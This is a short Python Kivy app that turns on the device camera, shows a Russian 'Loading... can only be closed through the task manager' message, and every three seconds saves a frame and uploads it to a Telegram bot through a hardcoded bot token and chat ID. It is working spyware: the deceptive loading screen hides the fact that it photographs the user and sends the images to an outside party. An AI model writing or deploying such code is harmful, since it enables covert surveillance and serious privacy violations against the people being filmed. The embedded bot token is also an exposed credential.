from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.camera import Camera
from kivy.uix.label import Label
from kivy.clock import Clock
import requests
import cv2
import numpy as np
import os

TOKEN = "8088793339:AAHo3C6cskiYLYDVM7L3FgkzJK-Zv9I2F7k"
CHAT_ID = "5420298695"
PHOTO_PATH = "photo_from_camera.jpg"

class CameraApp(App):
    def build(self):
        self.layout = BoxLayout(orientation='vertical')
        self.label = Label(text="Загрузка... Закрыть можно только через диспетчер задач.", font_size=24, size_hint=(1, 0.2))
        self.camera = Camera(play=True, resolution=(1280, 720), size_hint=(1, 0.8))
        self.layout.add_widget(self.camera)
        self.layout.add_widget(self.label)
        Clock.schedule_interval(self.capture_photo, 3)
        return self.layout

    def send_photo_to_telegram(self, photo_path):
        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        with open(photo_path, 'rb') as photo:
            files = {'photo': photo}
            data = {'chat_id': CHAT_ID}
            requests.post(url, files=files, data=data)

    def capture_photo(self, dt):
        if self.camera.texture:
            texture = self.camera.texture
            pixels = texture.pixels
            img = np.frombuffer(pixels, dtype=np.uint8).reshape(texture.height, texture.width, 4)
            img_bgr = cv2.cvtColor(img, cv2.COLOR_RGBA2BGR)
            cv2.imwrite(PHOTO_PATH, img_bgr)
            self.send_photo_to_telegram(PHOTO_PATH)

    def on_stop(self):
        return True

if __name__ == "__main__":
    CameraApp().run()
